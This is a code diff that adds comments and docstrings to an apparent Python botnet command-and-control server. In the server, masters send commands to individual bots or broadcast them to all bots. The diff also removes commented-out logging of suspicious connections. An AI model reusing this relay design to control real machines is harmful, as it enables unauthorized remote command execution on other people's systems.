@@ -35,10 +35,16 @@ class Server:
         pass
 
 """
+Description: Threaded funciton which takes care of individual bot's socket 
+Receives data from the bot, and does error handling 
 
+Param: 
+    - (bot) bot = Individual bot 
+    - (sock) sock = Socket of the bot 
 """
 def individual_bot_sock(bot,sock):
     while True:       
+        # TODO: Couldn't this just have bot as a param?? 
         data = sock.recv(1024).decode()
         print (data)
 
@@ -179,8 +185,13 @@ Param:
     - (list) tokens = List of commands, splitted by spaces 
     - (socket) mastersock = Master socket 
 
+Return; 
+    - (None) Sends debug message back to the master socket 
+
 """
 def execCommand(bots, tokens, mastersock):
+
+    # If command only has one token, execute the command 
     if len(tokens) == 1:
         if str(tokens[0]) == "ls":
             result = '' 
@@ -197,6 +208,7 @@ def execCommand(bots, tokens, mastersock):
         else:
             mastersock.send("Wrong command".encode())
 
+    # If command has two token, parse the bot index and command. 
     elif len(tokens) == 2: 
         if tokens[0].isdigit():
             print("[+] Bot[" + str(tokens[0]) + "]. Command: ", tokens[1])
@@ -212,6 +224,7 @@ def execCommand(bots, tokens, mastersock):
                     result +=  "\nCommand successfully delivered to all bots.\n"
                     mastersock.send(result.encode())
 
+        # If command has two token but starts with "broadcast", send to all the bots 
         elif str(tokens[0]) == "broadcast":
             print("[+] Sending broadcast command to all bots")
             for bot in bots:
@@ -227,7 +240,14 @@ def execCommand(bots, tokens, mastersock):
 def debug(string):
     print("[DEBUG]", string)
 
+"""
+Description: Master socket function which handles socket with the Master. 
+Specifically handles command the master issues 
 
+Param: 
+    - (socket) sock = Socket which will become master's socket 
+    - (list) bots = Lits of current bots that Master is able to conrol 
+"""
 def masterSocket(sock, bots):
     sock.send("Welcome to master shell!".encode())
     
@@ -244,6 +264,7 @@ def masterSocket(sock, bots):
 
     sock.close()
 
+# Creates Master thread. Server allows multiple masters 
 def createMasterThread(sock, sockets):
     thread = threading.Thread(target=masterSocket, args=(sock,sockets,))
     thread.start()
@@ -277,6 +298,7 @@ def serverSetup(port):
 
 # Global variables because I am a bad programmer. 
 # TODO: But really, need refactoring of this part 
+# TODO: Probably need a "server" class? :eyes: ? 
 host = ""
 port = int(sys.argv[1])
 bots = []
@@ -309,14 +331,6 @@ while True:
         print("Master is here.")
 
         createMasterThread(conn, bots)
-        
-    # If incoming socket is an opponent, log and close the socket
-    # Implement temporary ban 
-    #else:
-    #    print("[WARNING] Suspicious connection detected. Logging...")
-    #    print("[WARNING] Suspicious ip: ", addr[0], "port: ", addr[1])
-        # implement logging, temporary banning ip/port
-        #conn.close()
      
     else:
         pass
